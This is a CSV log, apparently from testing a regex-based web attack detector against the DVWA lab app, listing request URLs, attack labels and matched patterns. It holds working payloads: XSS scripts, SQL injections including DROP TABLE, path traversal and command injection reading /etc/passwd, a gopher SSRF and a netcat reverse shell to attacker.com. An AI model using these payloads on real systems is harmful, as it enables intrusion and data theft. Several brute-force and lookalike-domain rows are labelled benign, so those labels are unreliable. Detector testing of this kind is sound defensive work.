Timestamp,Source_IP,URL,POST_Body,Status_Code,attack_type,evidence,detection_method
1764330187.047114,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3cscript%3ealert%28%27XSS%27%29%3c%2fscript%3e,,200,Cross-Site Scripting (XSS),Matched regex pattern: '<script.*?>...',Regex
1764330187.425859,127.0.0.1,http://googl.com/dvwa/index.php,,302,Benign,No threat detected,None
1764330187.725515,127.0.0.1,http://paypa1.com/dvwa/index.php,,302,Benign,No threat detected,None
1764330188.051821,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/brute/?username=admin&password=123456&Login=Login,,200,Benign,No threat detected,None
1764330188.596198,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=javascript%3aalert%281%29,,200,Cross-Site Scripting (XSS),Matched regex pattern: 'javascript:...',Regex
1764330189.123158,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/upload/,,200,Benign,No threat detected,None
1764330189.415702,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/exec/?ip=127.0.0.1%3b+cat+%2fetc%2fpasswd&Submit=Submit,,200,Command Injection,Matched regex pattern: '(?:;|\||\|\||&&|\n|\$\()\...',Regex
1764330189.752922,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330190.03551,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330190.474547,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/brute/?username=support&password=toor&Login=Login,,200,Benign,No threat detected,None
1764330190.964478,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=id%3d1+UNION+SELECT+null%2c+user%28%29%2c+version%28%29&Submit=Submit,,200,SQL Injection,Matched regex pattern: 'union\s+(all\s+)?select...',Regex
1764330191.346065,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330191.675458,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=gopher%3a%2f%2f127.0.0.1%3a25%2f_MAIL,,200,SSRF,Matched regex pattern: 'gopher://...',Regex
1764330192.051162,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330192.545895,127.0.0.1,http://127.0.0.1/dvwa/index.php,,200,Benign,No threat detected,None
1764330193.035679,127.0.0.1,http://127.0.0.1/dvwa/logo.png,,404,Benign,No threat detected,None
1764330193.422391,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2f..%2fetc%2fpasswd,,200,Directory Traversal / LFI,Matched regex pattern: '\.\./...',Regex
1764330193.820586,127.0.0.1,http://127.0.0.1/dvwa/login.php,username=admin&password=password&Login=Login,302,Benign,No threat detected,None
1764330194.232159,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/upload/,,200,Benign,No threat detected,None
1764330194.55289,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/exec/?ip=127.0.0.1+%7c+nc+-e+%2fbin%2fsh+attacker.com+1234&Submit=Submit,,200,Command Injection,Matched regex pattern: '(?:;|\||\|\||&&|\n|\$\()\...',Regex
1764330194.873043,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=id%3d1%3b+DROP+TABLE+users&Submit=Submit,,200,SQL Injection,Matched regex pattern: '\b(insert\s+into|update\s...',Regex
1764330195.185667,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3cimg+src%3dx+onerror%3dalert%281%29%3e,,200,Cross-Site Scripting (XSS),Matched regex pattern: '(alert|confirm|prompt)\s*...',Regex
1764330195.71799,127.0.0.1,http://127.0.0.1/dvwa/vulnerabilities/brute/?username=root&password=password&Login=Login,,200,Benign,No threat detected,None
1764330196.269587,127.0.0.1,http://127.0.0.1/dvwa/logo.png,,404,Benign,No threat detected,None
